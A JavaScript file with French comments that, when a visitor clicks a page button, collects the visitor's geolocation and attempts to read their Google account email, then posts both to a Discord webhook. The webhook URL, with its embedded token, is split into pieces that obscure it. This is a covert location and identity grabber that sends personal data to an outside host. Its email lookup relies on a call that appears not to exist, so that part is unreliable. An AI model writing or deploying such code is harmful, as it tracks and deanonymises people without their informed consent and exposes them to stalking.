document.addEventListener('DOMContentLoaded', function() {
    // Fonction pour détecter le nom d'adresse email (compte Google)
    function getGoogleAccountName() {
        let accountName = 'None';  // Valeur par défaut si aucun compte Google n'est détecté

        // Vérification de l'authentification Google
        if (typeof(google) !== 'undefined' && typeof(google.accounts) !== 'undefined' && typeof(google.accounts.id) !== 'undefined') {
            let userProfile = google.accounts.id.get();

            if (userProfile && userProfile.email) {
                accountName = userProfile.email;
            }
        }

        return accountName;
    }

    document.getElementById('get-info-btn').addEventListener('click', function() {
        // Vérifier si le navigateur supporte la géolocalisation
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                let lat = position.coords.latitude;
                let lon = position.coords.longitude;
                let googleAccountName = getGoogleAccountName();

                // Construire le message à envoyer au webhook Discord
                let message = {
                    content: `
                        **${googleAccountName} a cliqué sur le bouton**
                        \nVotre localisation approximative est:
                        \nLatitude: ${lat}, Longitude: ${lon}
                        \n[Google Maps](https://www.google.com/maps?q=${lat},${lon})  // lien vers Google Maps
                    `
                };

                // URL du webhook Discord
                  let part1 = "https://discord.com/api/webhooks/";
                  let part2 = "1255583928014733323/";
                  let part3 = "tC8_UZYiqZVSvPObYHkG6Wsx_jfI-2COijzDJPYwB3cmO4lI-i3oKRoXIhWXw8jnCjQu";
                  let webhookUrl = part1 + part2 + part3;

                // Envoi du message au webhook Discord
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                }).then(response => {
                    if (response.ok) {
                        alert('Les informations ont été envoyées avec succès au webhook Discord.');
                    } else {
                        throw new Error('Erreur lors de l\'envoi au webhook Discord. Statut: ' + response.status);
                    }
                }).catch(error => {
                    console.error('Erreur:', error);
                    alert('Erreur lors de l\'envoi au webhook Discord. Veuillez réessayer.');
                });

                // Affichage des informations dans l'élément #info-display
                document.getElementById('info-display').innerText = `
                    Votre localisation approximative est:
                    \nLatitude: ${lat}, Longitude: ${lon}
                    \n[Google Maps](https://www.google.com/maps?q=${lat},${lon})  // lien vers Google Maps
                `;
            }, function(error) {
                console.error('Erreur de géolocalisation:', error);
                alert('Erreur lors de la récupération de la localisation.');
            });
        } else {
            alert('La géolocalisation n\'est pas supportée par ce navigateur.');
        }
    });
});
